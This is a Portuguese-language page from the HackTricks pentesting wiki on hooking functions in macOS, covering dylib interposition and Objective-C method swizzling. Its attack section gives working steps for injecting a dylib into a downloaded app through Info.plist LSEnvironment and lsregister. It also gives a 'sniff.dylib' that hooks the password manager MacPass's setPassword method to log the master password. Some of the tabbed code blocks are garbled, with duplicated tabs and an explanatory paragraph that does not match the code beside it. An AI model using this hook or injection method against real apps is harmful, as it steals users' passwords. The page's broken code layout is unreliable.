# Hooking de Funções no macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Interposição de Funções

Crie um **dylib** com uma seção **`__interpose`** (ou uma seção marcada com **`S_INTERPOSING`**) contendo tuplas de **ponteiros de função** que se referem às funções **originais** e às funções **de substituição**.

Em seguida, **injete** a dylib com **`DYLD_INSERT_LIBRARIES`** (a interposição precisa ocorrer antes do carregamento do aplicativo principal). Obviamente, as [**restrições** aplicadas ao uso de **`DYLD_INSERT_LIBRARIES`** também se aplicam aqui](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;

### Interpor printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% tab title="hello.c" %}
```c
#include <stdio.h>

int main() {
    printf("Hello, World!\n");
    return 0;
}
```
{% endtab %}

{% tab title="hello.c" %}
```c
#include <stdio.h>

int main() {
    printf("Olá, Mundo!\n");
    return 0;
}
```
{% endtab %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

typedef int (*orig_open_type)(const char *pathname, int flags);
typedef FILE *(*orig_fopen_type)(const char *pathname, const char *mode);

int open(const char *pathname, int flags) {
    orig_open_type orig_open;
    orig_open = (orig_open_type)dlsym(RTLD_NEXT, "open");
    printf("Opening file: %s\n", pathname);
    return orig_open(pathname, flags);
}

FILE *fopen(const char *pathname, const char *mode) {
    orig_fopen_type orig_fopen;
    orig_fopen = (orig_fopen_type)dlsym(RTLD_NEXT, "fopen");
    printf("Opening file: %s\n", pathname);
    return orig_fopen(pathname, mode);
}
```

Este é um exemplo de código em C que demonstra como realizar o hook de funções em um programa macOS. O código utiliza a biblioteca `dlfcn.h` para obter os ponteiros das funções originais `open` e `fopen`. Em seguida, ele substitui essas funções por suas próprias implementações, que imprimem uma mensagem informando o arquivo que está sendo aberto e, em seguida, chamam as funções originais.

Para utilizar esse código, você precisa compilar o arquivo `interpose2.c` em uma biblioteca compartilhada (por exemplo, `libinterpose.dylib`) e carregá-la no programa alvo usando a variável de ambiente `DYLD_INSERT_LIBRARIES`. Isso fará com que as chamadas para as funções `open` e `fopen` sejam redirecionadas para as implementações personalizadas.

Esse tipo de técnica pode ser útil para realizar a interceptação de chamadas de sistema ou de bibliotecas em um programa, permitindo que você monitore ou modifique o comportamento do programa de forma não intrusiva. No entanto, é importante ressaltar que o uso de técnicas de hooking pode ser considerado invasivo e pode violar os termos de uso de alguns softwares ou sistemas operacionais. Portanto, é essencial obter permissão adequada antes de utilizar essas técnicas.
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## Método Swizzling

Em ObjectiveC, é assim que um método é chamado: **`[instanciaDaMinhaClasse nomeDoMetodoPrimeiroParam:param1 segundoParam:param2]`**

É necessário o **objeto**, o **método** e os **parâmetros**. E quando um método é chamado, uma **mensagem é enviada** usando a função **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(algumObjeto, @selector(metodo1p1:p2:), valor1, valor2);`

O objeto é **`algumObjeto`**, o método é **`@selector(metodo1p1:p2:)`** e os argumentos são **valor1**, **valor2**.

Seguindo as estruturas do objeto, é possível chegar a um **array de métodos** onde os **nomes** e **ponteiros** para o código do método estão **localizados**.

{% hint style="danger" %}
Observe que, como os métodos e classes são acessados com base em seus nomes, essas informações são armazenadas no binário, portanto, é possível recuperá-las com `otool -ov </caminho/bin>` ou [`class-dump </caminho/bin>`](https://github.com/nygard/class-dump)
{% endhint %}

### Acessando os métodos brutos

É possível acessar as informações dos métodos, como nome, número de parâmetros ou endereço, como no exemplo a seguir:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Método Swizzling com method\_exchangeImplementations

A função **`method_exchangeImplementations`** permite **alterar** o **endereço** da **implementação** de **uma função por outra**.

{% hint style="danger" %}
Portanto, quando uma função é chamada, o que é **executado é a outra função**.
{% endhint %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really coode is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% hint style="warning" %}
Neste caso, se o código de implementação do método legítimo verifica o nome do método, ele pode detectar essa troca e impedir que ela seja executada.

A técnica a seguir não possui essa restrição.
{% endhint %}

### Troca de Método com method\_setImplementation

O formato anterior é estranho porque você está alterando a implementação de 2 métodos um pelo outro. Usando a função **`method_setImplementation`**, você pode **alterar** a **implementação** de um **método para o outro**.

Apenas lembre-se de **armazenar o endereço da implementação do original** se você for chamá-lo da nova implementação antes de sobrescrevê-lo, pois posteriormente será muito complicado localizar esse endereço.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Metodologia de Ataque de Hooking

Nesta página, foram discutidas diferentes maneiras de fazer hook em funções. No entanto, todas elas envolvem **executar código dentro do processo para atacar**.

Para fazer isso, a técnica mais fácil de usar é injetar um [Dyld via variáveis de ambiente ou sequestro](../macos-dyld-hijacking-and-dyld\_insert\_libraries.md). No entanto, acredito que isso também possa ser feito por meio de [injeção de processo Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

No entanto, ambas as opções estão **limitadas** a **binários/processos desprotegidos**. Verifique cada técnica para saber mais sobre as limitações.

No entanto, um ataque de hooking de função é muito específico, um invasor fará isso para **roubar informações sensíveis de dentro de um processo** (caso contrário, você faria apenas um ataque de injeção de processo). E essas informações sensíveis podem estar localizadas em aplicativos baixados pelo usuário, como o MacPass.

Portanto, o vetor de ataque seria encontrar uma vulnerabilidade ou remover a assinatura do aplicativo, injetar a variável de ambiente **`DYLD_INSERT_LIBRARIES`** por meio do Info.plist do aplicativo, adicionando algo como:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
e em seguida **re-registre** o aplicativo:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Adicione nessa biblioteca o código de hooking para exfiltrar as informações: Senhas, mensagens...

{% hint style="danger" %}
Note que em versões mais recentes do macOS, se você **remover a assinatura** do binário do aplicativo e ele foi executado anteriormente, o macOS **não executará mais o aplicativo**.
{% endhint %}

#### Exemplo de biblioteca
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referências

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
